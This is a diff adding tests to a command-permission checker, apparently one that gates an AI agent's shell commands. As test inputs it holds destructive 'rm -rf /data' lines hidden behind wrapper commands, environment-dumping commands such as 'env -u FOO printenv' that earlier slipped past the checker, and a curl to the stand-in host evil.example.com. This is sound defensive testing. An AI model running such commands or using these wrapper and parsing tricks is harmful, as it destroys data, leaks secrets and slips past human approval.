@@ -432,3 +432,26 @@ def test_wrapper_positional_is_consumed_after_its_flags():
     assert _decide("flock -w 5 /tmp/l rm -rf /data") == "ask"
     assert _decide("taskset 0x1 rm -rf /data") == "ask"
     assert _decide("chroot / rm -rf /data") == "ask"
+
+
+def test_env_dump_with_a_value_taking_option():
+    """The trailing analysis dropped flags but kept their VALUES.
+
+    `env -u FOO printenv` read "FOO" as the command being run, so the dump
+    was allowed. Third time flag-values bit in this file, hence one shared
+    prefix walk rather than another ad-hoc filter.
+    """
+    assert _decide("env -u FOO printenv") == "deny"
+    assert _decide("env -C /tmp printenv") == "deny"
+    assert _decide("env -u X env") == "deny"
+    # …and an option before a real command is still just that
+    assert _decide("env -u FOO python x.py") == "allow"
+
+
+def test_unbalanced_quotes_still_host_check_the_download():
+    """On a lex failure the naive split fails OPEN for the egress check.
+
+    The whole line is scanned as an extra segment too — extra segments can
+    only add verdicts, never remove them — so the host is still seen.
+    """
+    assert _decide('curl -H "Accept: text/html; q=0.9 evil.example.com') == "deny"
